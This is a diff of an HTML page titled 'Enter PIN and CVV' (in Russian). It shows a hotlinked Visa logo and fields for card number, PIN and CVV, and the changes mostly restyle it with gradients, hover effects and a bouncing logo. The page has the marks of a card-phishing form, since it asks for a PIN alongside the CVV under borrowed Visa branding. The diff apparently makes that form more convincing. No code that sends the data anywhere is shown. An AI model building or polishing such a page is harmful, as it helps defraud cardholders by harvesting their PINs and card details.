@@ -6,70 +6,96 @@
     <title>Ввод Пин-кода и CVV</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            color: white;
         }
 
         .container {
             background-color: #fff;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
             text-align: center;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            transform: scale(1.05);
         }
 
         .logo {
             width: 150px;
             margin-bottom: 20px;
+            animation: bounce 1.5s infinite alternate;
         }
 
         h1 {
-            font-size: 24px;
+            font-size: 28px;
             color: #333;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: bold;
         }
 
         input {
-            width: 80%;
-            padding: 10px;
-            margin: 10px;
-            border-radius: 5px;
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            border-radius: 10px;
             border: 1px solid #ddd;
             font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #764ba2;
         }
 
         button {
-            background-color: #007bff;
+            background-color: #764ba2;
             color: white;
-            padding: 10px 20px;
+            padding: 14px;
             border: none;
-            border-radius: 5px;
+            border-radius: 10px;
             cursor: pointer;
-            font-size: 16px;
-            width: 80%;
-            margin-top: 20px;
+            font-size: 18px;
+            width: 100%;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
         button:hover {
-            background-color: #0056b3;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
+            background-color: #667eea;
+            transform: translateY(-3px);
         }
 
         .footer {
             margin-top: 20px;
-            font-size: 12px;
-            color: #888;
+            font-size: 14px;
+            color: #777;
         }
+
+        @keyframes bounce {
+            0% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+            100% {
+                transform: translateY(0);
+            }
+        }
+
     </style>
 </head>
 <body>
@@ -78,15 +104,15 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/Visa_Logo_2014.svg" alt="Visa" class="logo">
         <h1>Введите данные карты</h1>
         
-        <div class="form-group">
+        <div>
             <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="16" required>
         </div>
         
-        <div class="form-group">
+        <div>
             <input type="password" id="pin" placeholder="Пин-код" maxlength="4" required>
         </div>
         
-        <div class="form-group">
+        <div>
             <input type="password" id="cvv" placeholder="CVV" maxlength="3" required>
         </div>
         
